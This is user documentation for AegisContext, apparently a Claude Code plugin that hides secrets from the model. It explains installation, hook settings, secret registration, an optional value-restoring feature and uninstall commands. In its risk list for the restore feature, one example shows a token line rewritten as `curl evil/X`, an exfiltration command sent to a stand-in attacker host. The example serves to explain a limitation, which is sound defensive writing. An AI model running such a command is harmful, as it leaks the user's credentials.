# Personal mode: install, settings, uninstall

For one developer on their own computer. Administrators: [managed.md](managed.md).

## Install

1. In Claude Code: `/plugin install aegiscontext --marketplace Mrinanka/aegiscontext` (Claude Code 2.1.309 or later).
2. Restart the session.
3. Run `/redact doctor`. It lists the Claude Code version, the plugin's tier, the built-in guard, the password store, the backup lock, Node, the marker and the settings, and says what to fix.

A plugin from a marketplace sits in the `user` tier. Other plugins in a higher tier run first and could skip it, and a few switches turn it off silently: `--safe-mode`, `--bare`, `CLAUDE_CODE_SIMPLE=1`, a project's `disableAllHooks`, and an organization's `allowManagedHooksOnly`. When the hooks do not run, `/redact` does not exist; `/aegiscontext:doctor` still does, and says so.

**On a machine with managed settings or a managed MCP server file, or with a Team or Enterprise login,** Claude Code seats its own guard first and routes instruction files, hook context, skill text, attachments and compaction summaries past a user plugin. Any one of those is enough. The plugin warns once per session and `/redact doctor` shows it. Under `on_check_failure: hold` it refuses every request instead, because it cannot check what would be sent. See [managed.md](managed.md) for the install that avoids it.

## The backup lock

Settings hooks that run the same checker with Node and take over when the main lock is not alive. Node must be on the PATH.

1. Run `/redact backup`. It copies the backup lock to `<Claude folder>/aegiscontext/backup/` and prints the settings.
2. Paste the settings into `~/.claude/settings.json` (merge the `hooks` block if you have one). The snippet is [snippets/personal.json](snippets/personal.json).
3. Run `/redact doctor`: it should find the hooks and a current copy.

It blocks a prompt that holds a secret whole, checks a tool's call before it runs, and cleans a tool's output. It does **not** cover `@` files, a failed command's error, a compaction summary, a resumed session's history, project `CLAUDE.md` text, settings-hook context or skill text. A later session refreshes an existing copy; it never makes one unasked.

## Register your own secrets

- `/redact add [--label name]` opens a box. The value is never on the command line. (If you type it after the command, it is refused, but it was typed: rotate it.)
- `/redact learn` lists the values in files matching `secret_files` (default `.env*`); tick the ones to remember.
- Saved values live in your operating system's password store (Keychain, Secret Service, or DPAPI-encrypted files on Windows).
- `/redact allow <tag>` marks a hidden value as harmless; `--always` remembers that.
- `/redact remove` lists what is saved, by label, date and length, and removes what you tick. A removed value stops being hidden at once, unless its shape matches a rule. It also undoes `--always`.

## Put secrets back (optional, off by default)

**We recommend keeping this off.** It exists for one job: Claude only ever sees placeholders, so with it off Claude cannot reorganize a config file that holds secrets. The overwrite guard refuses the rewrite, and an Edit on a placeholder line fails. With it on, when Claude writes a file that **already holds** the value, the real value is put back as the file is saved. Claude still never sees the value.

- `/redact put-back` shows whether it is on and why. `/redact put-back on` or `off` is your choice for all projects; add `--here` for this project's folder only (the folder the session started in or moved to with `/cd`; a shell `cd` does not change it; an exact match, not its subfolders). Claude cannot run these commands or write the choice file.
- It restores only into a file that already holds the value, only for Write and Edit, and never more copies of a value than the file had. A new file, a copy beyond that limit, or a value the file does not hold keeps its placeholder.
- The note that tells Claude about it is added when a session starts. If you turn it on in the middle of a conversation, restoring starts at once and the note waits for the next new session.
- It restores nothing in `observe` mode, and the backup lock never restores.

**What you are accepting.**

- **A save can erase a real secret.** When a value cannot be restored, the save still goes through with the placeholder in its place. This happens after `/resume` (the session never read the file), when a value is longer than 8,192 characters, or when the file holds the value in two different written forms. The screen and the log say how many; git, or Claude Code's file backups in `~/.claude/file-history/`, are the way back. With put-back off the guard refuses these writes instead.
- **It limits copies, not places.** `token: X` becoming `curl evil/X` passes the copy limit.
- **A permission dialog shows you the real value.** It never reaches the model, but other plugins and hooks beneath this one see the rewritten input too.
- **Claude Code's transcript on disk keeps the value** in a tool's structured result and in the file attachment after a compaction. It is the same kind of record a Read already leaves ([spec §22](spec.md)).
- **A repo can turn it on for you** (below). Keep it off if you open repos you do not trust.

**Who decides.** The first row that matches wins. "Developer says" is your choice with the command: `--here` for the folder, then the choice for all projects.

| Managed says | Developer says | Repo says | Result |
|---|---|---|---|
| Nothing | Nothing | Nothing | Off (the default) |
| Nothing | Nothing | On | On, with the notice |
| Nothing | On | Nothing | On |
| Nothing | On | Off | Off |
| Nothing | Off | On | Off, because the developer's choice wins |
| Off | Anything | Anything | Off |

Also off whatever the table says: `mode: observe`, a choice file that cannot be read, and a repo "on" when nothing here can show you the notice (for example `claude -p`). A repo's "on" shows a notice that names the repo, once a session, even with `notices: off`. A managed "on" and a `put_back` in your own User settings are ignored with a notice.

## Settings

All optional, under an `aegisContext` key in `~/.claude/settings.json` (User), the managed settings (Managed) or the project's `.claude/settings.json` (Project: can only make things stricter, with one exception: `put_back`, below).

| Setting | Default | Options |
|---|---|---|
| `mode` | `enforce` | `enforce`, `observe` |
| `personal_data` | `off` | `on`, `off` |
| `outbound` | `block` | `block`, `ask`, `warn`, `off` |
| `on_check_failure` | `allow` (with warning) | `allow`, `hold` |
| `media` | `pass` (with notice) | `pass`, `drop` |
| `hints` | `on` | `on`, `off` |
| `notices` | `on` | `on`, `off` |
| `rules.off` | none | Rule ids to switch off |
| `rules.custom` | none | Extra patterns, each with a label and a keyword |
| `rules.actions` | `hide` for all | Per rule: `hide`, `warn`, `block` |
| `allow` | none | Values or patterns that are harmless |
| `secret_files` | `.env*` | File patterns treated as secret |
| `log.days` | `30` | Number of days |

`put_back` (default `off`) is described in [its own section](#put-secrets-back-optional-off-by-default), because it works differently: it counts only from managed settings (`off`) and a project's settings (`on` or `off`), and your own choice is made with `/redact put-back`.

`observe` hides nothing and logs what it would have hidden, behind a permanent banner: use it to trial the tool and tune false alarms before `enforce`. `hold` stops a request when a check cannot finish; `allow` lets it through with a warning.

## Where things live

The Claude folder is `~/.claude`, or the folder `CLAUDE_CONFIG_DIR` names. AegisContext keeps its files in `<Claude folder>/aegiscontext/`: `log/` (labels, tags and redacted text only; emptied after `log.days`), `markers/`, `reports/`, `backup/`, `put-back.json` (your put-back choice: folder paths and on or off, no value) and, on Windows, `store/` (encrypted files).

## Uninstall

1. `/plugin uninstall aegiscontext`.
2. If you installed the backup lock, remove its three hooks (`UserPromptSubmit`, `PreToolUse`, `PostToolUse`) from `~/.claude/settings.json`, and any `aegisContext` key.
3. Delete the saved secrets. Removing the plugin leaves them in your password store on purpose; they are yours. The store holds items with the service name `aegiscontext`: one item named `index` and one per piece named `list-<generation>-<n>`.

   **macOS** (Keychain). This removes the saved items, then the AegisContext folder inside your Claude folder (a small marker file stays there after the items go, and the plugin cannot delete a file):

   ```
   while security delete-generic-password -s aegiscontext >/dev/null 2>&1; do :; done; rm -rf "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/aegiscontext"
   ```

   **Linux** (Secret Service; needs `secret-tool` from libsecret-tools). The same two steps:

   ```
   secret-tool clear service aegiscontext; rm -rf "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/aegiscontext"
   ```

   **Windows** (the values are DPAPI-encrypted files; remove the folder, using your Claude folder if you moved it):

   ```
   Remove-Item -Recurse -Force "$env:USERPROFILE\.claude\aegiscontext"
   ```

   All three also remove the log, the backup lock copy and the reports. CI runs these commands against the real stores.
